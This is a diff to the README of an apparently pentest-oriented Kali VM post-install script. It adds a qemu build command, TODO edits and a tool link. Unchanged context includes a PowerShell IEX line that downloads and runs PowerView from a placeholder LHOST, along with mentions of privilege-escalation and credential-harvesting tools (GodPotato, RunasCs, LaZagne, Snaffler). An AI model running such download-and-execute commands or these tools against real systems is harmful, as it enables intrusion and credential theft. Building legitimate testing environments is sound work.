@@ -8,6 +8,9 @@ This post-installation script is intended to be used on minimal Kali VM with no 
 
 ```
 ./build.sh -v vmware -D none -Z $(cat /etc/timezone) -T none -P "network-manager curl neovim"
+
+# alternatively
+./build.sh -v qemu -D none -Z $(cat /etc/timezone) -T none -P "network-manager curl neovim"
 ```
 
 If you are building on a Windows machine:
@@ -61,11 +64,9 @@ IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/win/powerview.ps1")
 
 ## TODOs
 
-- Download windows ligolo-ng agent binary and put in /opt/win for install.sh
-- Move unused tools out of requirements_\*.txt to optional_installs
 - script to patch .local/share/navi/cheats
 - [OPTIONAL] automount usb
-- test pipewire
+- test pipewire ligolo-ng
 
 ## Checkout
 Below are things I will get around to trying and will add them to the install script if I find them useful.
@@ -78,6 +79,7 @@ Below are things I will get around to trying and will add them to the install sc
 - https://github.com/antonioCoco/RunasCs
 - Note: If using GodPotato, it's easier to create a new admin user and switch to them with RunasCs.
 - https://github.com/AlessandroZ/LaZagne or Snaffler
+- https://github.com/Azathothas/Toolpacks
 
 ## Credit
 - https://github.com/AyoItsYas/Mainte
